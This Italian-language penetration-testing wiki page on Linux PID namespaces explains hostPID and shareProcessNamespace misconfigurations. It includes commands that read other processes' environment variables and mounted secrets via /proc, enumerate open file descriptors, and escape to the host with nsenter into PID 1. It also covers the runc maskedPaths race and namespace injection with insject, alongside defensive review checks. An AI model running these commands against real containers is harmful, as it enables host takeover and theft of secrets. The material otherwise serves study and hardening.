# PID Namespace

{{#include ../../../../../banners/hacktricks-training.md}}

## Panoramica

Il PID namespace controlla il modo in cui i processi vengono numerati e quali processi sono visibili. Per questo un container può avere il proprio PID 1 anche se non è una macchina reale. All'interno del namespace, il workload vede quello che appare come un albero dei processi locale. All'esterno del namespace, l'host continua a vedere i PID reali dell'host e l'intero panorama dei processi.<sup>[[3]](#references)</sup>

Dal punto di vista della sicurezza, il PID namespace è importante perché la visibilità dei processi è preziosa. Una volta che un workload può vedere i processi dell'host, potrebbe essere in grado di osservare i nomi dei servizi, gli argomenti della command line, i secret passati negli argomenti dei processi, lo stato derivato dall'ambiente tramite `/proc` e potenziali target per l'ingresso nei namespace. Se può fare più che limitarsi a vedere questi processi, per esempio inviando signal o usando ptrace nelle condizioni corrette, il problema diventa molto più grave.

## Funzionamento

Un nuovo PID namespace inizia con una propria numerazione interna dei processi. Il primo processo creato al suo interno diventa il PID 1 dal punto di vista del namespace, il che significa anche che riceve semantiche speciali simili a quelle di init per i processi figli orfani e per il comportamento dei signal. Questo spiega molte peculiarità dei container relative ai processi init, alla gestione degli zombie e al motivo per cui nei container vengono talvolta usati piccoli wrapper init.<sup>[[3]](#references)</sup>

I PID namespace formano una gerarchia. Un processo in un namespace antenato può indirizzare i discendenti usando il PID assegnato in quell'antenato, ma un discendente non può indirizzare i task presenti esclusivamente nell'antenato tramite le normali syscall basate sui PID, né usare `setns()` per risalire a un PID namespace antenato. Un procfs appartenente all'antenato ed esposto deliberatamente al discendente può comunque fare leak della vista dei processi dell'antenato. Inoltre, entrare in un PID namespace con `setns()` modifica il namespace per i **futuri figli**, non per il chiamante stesso; per questo gli strumenti eseguono un fork dopo l'ingresso. Un mount procfs conserva la vista dei PID del processo che lo ha montato, motivo per cui creare un procfs nuovo dopo `unshare(CLONE_NEWPID)` è rilevante per la sicurezza e non solo un dettaglio estetico.<sup>[[3]](#references)</sup>

La lezione importante per la sicurezza è che un processo può sembrare isolato perché vede solo il proprio albero dei PID, ma tale isolamento può essere rimosso deliberatamente. Docker lo espone tramite `--pid=host`, mentre Kubernetes lo fa tramite `hostPID: true`. Una volta che il container entra nel PID namespace dell'host, il workload vede direttamente i processi dell'host e molti attack path successivi diventano molto più realistici.

## Lab

Per creare manualmente un PID namespace:
```bash
sudo unshare --pid --fork --mount-proc bash
ps -ef
echo $$
```
La shell ora vede una vista privata dei processi. Il flag `--mount-proc` è importante perché monta un'istanza procfs che corrisponde al nuovo PID namespace, rendendo coerente l'elenco dei processi dall'interno.<sup>[[3]](#references)</sup>

Per confrontare il comportamento dei container:
```bash
docker run --rm debian:stable-slim ps -ef
docker run --rm --pid=host debian:stable-slim ps -ef | head
```
La differenza è immediata e facile da comprendere, motivo per cui questo è un buon primo lab per i lettori.

## Utilizzo a runtime

I container normali in Docker, Podman, containerd e CRI-O ricevono un proprio PID namespace. I container Kubernetes normalmente hanno viste PID separate; `shareProcessNamespace: true` crea deliberatamente un'unica vista a livello di Pod.<sup>[[4]](#references)</sup> Al contrario, `hostPID: true` seleziona il PID namespace del nodo. Gli ambienti LXC/Incus si basano sulla stessa primitiva del kernel, sebbene i casi d'uso dei system-container possano esporre alberi dei processi più complessi e incoraggiare più scorciatoie di debugging.

La stessa regola si applica ovunque: se il runtime ha scelto di non isolare il PID namespace, si tratta di una riduzione deliberata del confine del container.

## Misconfigurazioni

La misconfigurazione canonica è la condivisione del PID dell'host. I team spesso la giustificano per comodità di debugging, monitoraggio o gestione dei servizi, ma dovrebbe sempre essere trattata come un'eccezione di sicurezza significativa. Anche se il container non dispone di una primitiva immediata di scrittura sui processi dell'host, la sola visibilità può rivelare molte informazioni sul sistema. Una volta aggiunte capability come `CAP_SYS_PTRACE` o un accesso utile a procfs, il rischio aumenta considerevolmente.

Un altro errore consiste nel presumere che, poiché il workload non può terminare o sottoporre a ptrace i processi dell'host per impostazione predefinita, la condivisione del PID dell'host sia quindi innocua. Questa conclusione ignora il valore dell'enumeration, la disponibilità di target per l'ingresso nei namespace e il modo in cui la visibilità dei PID si combina con altri controlli indeboliti.

### Condivisione dei processi a livello di Pod in Kubernetes

`shareProcessNamespace: true` è diverso da `hostPID`: espone i processi degli **altri container nello stesso Pod**, non i processi del nodo. Un sidecar compromesso o un container di debug può quindi enumerare le command line e i dati ambientali dei container fratelli, in base ai controlli di accesso di procfs, inviare segnali quando le credenziali lo consentono e attraversare il filesystem di un container fratello tramite `/proc/<pid>/root`. Kubernetes avverte esplicitamente che i secret presenti nella command line/nell'ambiente e i filesystem dei container sono quindi protetti soltanto dalle autorizzazioni Unix applicabili.<sup>[[4]](#references)</sup>

Revisione utile lato cluster:
```bash
kubectl get pods -A -o json | jq -r '
.items[] |
select(.spec.hostPID == true or .spec.shareProcessNamespace == true) |
[.metadata.namespace,.metadata.name,
(.spec.hostPID // false),(.spec.shareProcessNamespace // false)] | @tsv'
```
Da un container compromesso in un namespace PID a livello dell'intero Pod, verifica innanzitutto l'accesso effettivo invece di presumere che la visibilità equivalga alla leggibilità:<sup>[[4]](#references)</sup>
```bash
victim=$(ps -eo pid,args | awk '/[n]ginx|[j]ava|[p]ython/{print $1; exit}')
[ -n "$victim" ] || { echo "No candidate process found"; exit 1; }
tr '\0' ' ' < "/proc/$victim/cmdline" 2>/dev/null; echo
tr '\0' '\n' < "/proc/$victim/environ" 2>/dev/null | sed -n '1,20p'
find "/proc/$victim/root/run/secrets" -maxdepth 2 -type f -ls 2>/dev/null
```
## Abuso

Se il PID namespace dell'host è condiviso, un attacker può ispezionare i processi dell'host, raccogliere gli argomenti dei processi, identificare servizi interessanti, individuare PID candidati per `nsenter` oppure combinare la visibilità dei processi con privilegi correlati a `ptrace` per interferire con i workload dell'host o adiacenti. In alcuni casi, vedere semplicemente il processo a esecuzione prolungata corretto è sufficiente per ridefinire il resto del piano d'attacco.

Il primo passaggio pratico consiste sempre nel confermare che i processi dell'host siano realmente visibili:
```bash
readlink /proc/self/ns/pid
ps -ef | head -n 50
ls /proc | grep '^[0-9]' | head -n 20
```
Una volta che i PID dell'host sono visibili, gli argomenti dei processi e i target di accesso ai namespace diventano spesso la fonte di informazioni più utile:
```bash
for p in 1 $(pgrep -n systemd 2>/dev/null) $(pgrep -n dockerd 2>/dev/null); do
echo "PID=$p"
tr '\0' ' ' < /proc/$p/cmdline 2>/dev/null; echo
done
```
Se `nsenter` è disponibile e sono presenti privilegi sufficienti, verifica se un processo host visibile può essere utilizzato come ponte verso il namespace:
```bash
which nsenter
nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "nsenter blocked"
```
Anche quando l'ingresso è bloccato, la condivisione dei PID dell'host è già preziosa perché rivela la struttura dei servizi, i componenti runtime e i potenziali processi privilegiati da prendere di mira successivamente. La sola visibilità dei PID **non** concede il permesso di inviare signal, eseguire trace, leggere voci sensibili in `/proc/<pid>`, né entrare negli altri namespace del target; contano comunque le credenziali, la dumpability, le capabilities nel user namespace proprietario del namespace del target, le policy di Yama/LSM e seccomp.<sup>[[3]](#references)</sup> Vedi [CAP_SYS_PTRACE](../../../../interesting-files-permissions/linux-capabilities.md#cap_sys_ptrace) per esempi di process-injection.

La visibilità dei PID dell'host rende inoltre più realistico l'abuso dei file descriptor. Se un processo privilegiato dell'host o un workload vicino ha aperto un file o un socket sensibile, l'attaccante potrebbe essere in grado di ispezionare `/proc/<pid>/fd/` e accedere all'oggetto sottostante, a seconda dei controlli in stile ptrace, della proprietà, delle opzioni di mount di procfs, del tipo di oggetto e del modello del servizio target. Vedere semplicemente un symlink FD non significa che sia possibile aprirlo, e un socket non può essere duplicato semplicemente aprendo il suo symlink `/proc/<pid>/fd/N`. Per la distinta primitive `pidfd_getfd()` e i relativi controlli di autorizzazione, vedi [Linux ptrace exit-race pidfd FD theft](../../../../main-system-information/kernel-lpe-cves/linux-ptrace-exit-race-pidfd_getfd-fd-theft.md).<sup>[[3]](#references)</sup>
```bash
for fd_dir in /proc/[0-9]*/fd; do
ls -l "$fd_dir" 2>/dev/null | sed "s|^|$fd_dir -> |"
done
grep " /proc " /proc/mounts
```
Questi comandi sono utili perché mostrano se `hidepid=1` o `hidepid=2` stanno riducendo la visibilità tra processi e se descrittori evidentemente interessanti, come file segreti aperti, log o socket Unix, sono visibili.

### Esempio completo: PID dell'host + `nsenter`

La condivisione dei PID dell'host diventa un host escape diretto quando il processo dispone anche di privilegi sufficienti per unirsi ai namespace dell'host:
```bash
ps -ef | head -n 50
capsh --print | grep cap_sys_admin
nsenter -t 1 -m -u -n -i -p /bin/bash
```
Se il comando ha esito positivo, il processo del container è ora in esecuzione nei namespace mount, UTS, network, IPC e PID dell'host. L'impatto consiste nella compromissione immediata dell'host.

Anche quando `nsenter` non è presente, lo stesso risultato può essere ottenuto tramite il binary dell'host se il filesystem dell'host è montato:
```bash
/host/usr/bin/nsenter -t 1 -m -u -n -i -p /host/bin/bash 2>/dev/null
```
### Note recenti sul runtime

Alcuni attacchi rilevanti per i PID namespace non sono le tradizionali misconfigurazioni `hostPID: true`, ma bug di implementazione del runtime relativi al modo in cui le protezioni di procfs vengono applicate durante la configurazione del container.

#### `maskedPaths` race verso il procfs dell'host

Nelle versioni vulnerabili di `runc`, gli attacker in grado di controllare l'immagine del container o il workload di `runc exec` potevano introdurre una race nella fase di masking sostituendo il `/dev/null` del container con un symlink verso un path sensibile di procfs, come `/proc/sys/kernel/core_pattern`. Se la race aveva successo, il bind mount del masked path poteva essere applicato al target errato ed esporre al nuovo container i knob di procfs globali dell'host.<sup>[[1]](#references)</sup>

Comando utile per la revisione:
```bash
jq '.linux.maskedPaths' config.json 2>/dev/null
```
Questo è importante perché l'impatto finale potrebbe essere lo stesso di un'esposizione diretta di procfs: `core_pattern` o `sysrq-trigger` scrivibili, seguiti dall'esecuzione di codice sull'host o da una denial of service. Le pagine dedicate ai [masked paths](../masked-paths.md) e ai [sensitive host mounts](../../sensitive-host-mounts.md) trattano la superficie d'attacco generale di procfs senza duplicarla qui.

#### Namespace injection con `insject`

Gli strumenti di namespace injection come `insject` mostrano che l'interazione con un PID namespace non richiede sempre di entrare preventivamente nel namespace target prima della creazione del processo. Un helper può collegarsi successivamente, usare `setns()` ed eseguire codice mantenendo la visibilità sullo spazio dei PID target:<sup>[[2]](#references)</sup>
```bash
sudo insject -S -p $(pidof containerd-shim) -- bash -lc 'readlink /proc/self/ns/pid && ps -ef'
```
Questo tipo di tecnica è principalmente importante per il debugging avanzato, gli strumenti offensivi e i workflow di post-exploitation, nei quali il contesto del namespace deve essere associato dopo che il runtime ha già inizializzato il workload.

### Pattern di abuso degli FD

Vale la pena evidenziare esplicitamente due pattern quando i PID dell'host sono visibili. Primo, un processo con privilegi può mantenere aperto un file descriptor sensibile attraverso `execve()` perché non era marcato `O_CLOEXEC`. Secondo, i servizi possono passare file descriptor tramite socket Unix usando `SCM_RIGHTS`. In entrambi i casi, l'oggetto interessante non è più il pathname, ma l'handle già aperto che un processo con privilegi inferiori può ereditare o ricevere.

Questo è importante nel lavoro con i container perché l'handle può puntare a `docker.sock`, a un log privilegiato, a un file di secret dell'host o a un altro oggetto di alto valore, anche quando il path in sé non è direttamente raggiungibile dal filesystem del container.

## Controlli

Lo scopo di questi comandi è determinare se il processo dispone di una vista privata dei PID oppure se può già enumerare un insieme di processi molto più ampio.
```bash
readlink /proc/self/ns/{pid,pid_for_children,user,mnt}
grep -E '^(Name|Pid|PPid|NSpid|Uid|Gid|TracerPid):' /proc/self/status
ps -ef | head
findmnt -no TARGET,FSTYPE,OPTIONS /proc
cat /proc/sys/kernel/yama/ptrace_scope 2>/dev/null
capsh --print 2>/dev/null | grep -E 'Current:|Bounding'
```
Cosa è interessante qui:<sup>[[3]](#references)</sup>

- Se l'elenco dei processi contiene servizi dell'host evidenti, probabilmente la condivisione dei PID dell'host è già attiva.
- Vedere solo un piccolo albero locale al container è il comportamento normale di base; vedere `systemd`, `dockerd` o daemon non correlati non lo è.
- `NSpid` può esporre la mappatura dei PID tra namespace annidati. Il valore più a sinistra è relativo al namespace PID associato al mount di procfs, seguito dai valori dei namespace annidati successivi.
- `readlink /proc/self/ns/pid` da solo non può dimostrare `hostPID`: anche un container isolato ha un inode valido del namespace PID. Correlarlo con l'elenco dei processi, il mount di procfs, la configurazione del runtime e un inode del namespace lato host, quando disponibile.
- Una volta visibili i PID dell'host, anche le informazioni sui processi in sola lettura diventano utili per la reconnaissance.

Se scopri un container in esecuzione con la condivisione dei PID dell'host, non considerarla una differenza puramente estetica. Si tratta di un cambiamento sostanziale in ciò che il workload può osservare e potenzialmente influenzare.



## References

- [1] [avviso di sicurezza di runc: escape dal container tramite abuso di "masked path" dovuto a condizioni di race nei mount (CVE-2025-31133)](https://github.com/opencontainers/runc/security/advisories/GHSA-9493-h29p-rfm2)
- [2] [Rilascio dello strumento – insject: un injector di Linux Namespace](https://www.nccgroup.com/research-blog/tool-release-insject-a-linux-namespace-injector/)
- [3] [Manuale Linux man-pages 6.19](https://www.kernel.org/pub/linux/docs/man-pages/book/man-pages-6.19.pdf)
- [4] [Condividere il Process Namespace tra container in un Pod](https://kubernetes.io/docs/tasks/configure-pod-container/share-process-namespace/)
{{#include ../../../../../banners/hacktricks-training.md}}
